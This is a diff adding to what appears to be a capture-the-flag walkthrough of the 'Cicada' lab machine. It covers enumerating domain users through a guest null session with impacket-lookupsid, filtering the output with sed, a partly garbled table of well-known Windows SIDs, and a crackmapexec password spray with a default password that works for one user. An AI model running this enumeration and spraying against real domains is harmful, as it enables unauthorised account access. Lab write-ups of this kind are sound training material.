@@ -76,5 +76,54 @@ smbclient  //cicada.htb/HR
 | mssqlclient.py | Executes SQL queries on MSSQL servers. |
 | rpcdump.py     | Lists RPC endpoints on a target.         |
 
+- Now lets try lookupsids from impackets with "guest" and "-no-passs" with (Attempts authentication without a password (null session).)
+```bash
+impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass 
+```
+![alt text](image-5.png)
+- we find groups, users, and aliases within the domain
 
+- To view SID's 
+```bash
+In cmd - wmic useraccount get name,sid
+In power shell - Get-ADUser -Identity "Username" | Select-Object SID
+In impackets lookupsid - impacket-lookupsid 'DOMAIN/user'@TARGET_IP
+```
+### Common Well-Known SIDs
+- Windows has built-in SIDs for default accounts and groups:
+
+| Tool          | Purpose                                   |Purpose                                   |
+|---------------|-------------------------------------------|-------------------------------------------|
+| S-1-5-21-domain-500 |Administrator   |Built-in admin account.|
+| S-1-5-21-domain-501 |Guest          |Built-in guest account.|  
+| S-1-5-21-domain-502 |Krbtgt         |Kerberos key distribution center (KDC).|
+| S-1-5-21-domain-512 |Domain Admins  |Group of all domain administrators.      |
+|S-1-5-21-domain-513|Domain  Users|Group of all authenticated users.|
+|S-1-5-18|Local System|Built-in system account with high privileges.|
+|S-1-5-32-544|Administrators|Local administrators group.|
+
+- Coming back to our ad  - since we want a list of the users only we will separate them with small alteration as below
+
+```bash
+sed 's/.*\\\(.*\) (SidTypeUser)/\1/' 
+.*\\: Matches everything up to and including the backslash (domain)
+\(.*\): Captures the username (saved in group \1)
+(SidTypeUser): Matches the trailing identifier
+\1: Replaces entire line with just the captured username
+```
+- So the final command is
+```bash
+ impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/'
+```
+![alt text](image-6.png)
+
+- Now lets create a user list text file and then using this and lets try the password-spray attack
+### Password Spraying
+---------------------------------------------------------------------------------------------------------------------------------------
+- For password spraying we choosing crackmapexec only
+```bash
+crackmapexec smb cicada.htb -u user.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
+```
+![alt text](image-7.png)
+- We can observe that the user michael is still using the old default password given by the AD
 
